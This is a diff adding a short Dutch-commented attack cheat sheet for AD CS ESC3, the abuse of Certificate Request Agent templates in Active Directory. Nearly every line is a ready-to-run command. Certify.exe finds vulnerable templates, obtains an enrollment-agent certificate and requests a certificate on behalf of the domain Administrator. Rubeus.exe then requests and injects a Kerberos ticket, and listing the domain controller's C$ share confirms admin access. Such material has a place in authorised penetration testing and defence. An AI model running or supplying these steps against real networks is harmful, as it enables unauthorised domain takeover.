@@ -1,0 +1,17 @@
+# AD CS ESC3 - Certificate Request Agent abuse
+# Template maakt het mogelijk om certificaten namens anderen aan te vragen
+# Vereist 2 templates: een "enrollment agent" template + een target template
+# Stap 1: Vind Certificate Request Agent template
+.\Certify.exe find /vulnerable
+# Zoek naar: pkiextendedkeyusage: Certificate Request Agent
+# Stap 2: Request Certificate Request Agent certificaat
+.\Certify.exe request /ca:dc01.domain.local\domain-CA /template:SmartCardEnrollment-Agent
+# Convert naar .pfx
+# Stap 3: Met agent cert een certificaat aanvragen namens Administrator
+.\Certify.exe request /ca:dc01.domain.local\domain-CA /template:SmartCardEnrollment-Users /onbehalfof:domain\Administrator /enrollcert:esc3agent.pfx /enrollcertpw:Password123!
+# Stap 4: TGT aanvragen met het verkregen certificaat
+.\Rubeus.exe asktgt /user:Administrator /certificate:esc3user.pfx /password:Password123! /ptt
+# Stap 5: Verifieer
+ls \\dc01.domain.local\c$
+# Tip: ESC3 is minder voorkomend maar zeer krachtig
+# Tip: Check of Enrollment Agent Restrictions geconfigureerd zijn (beperkt target)
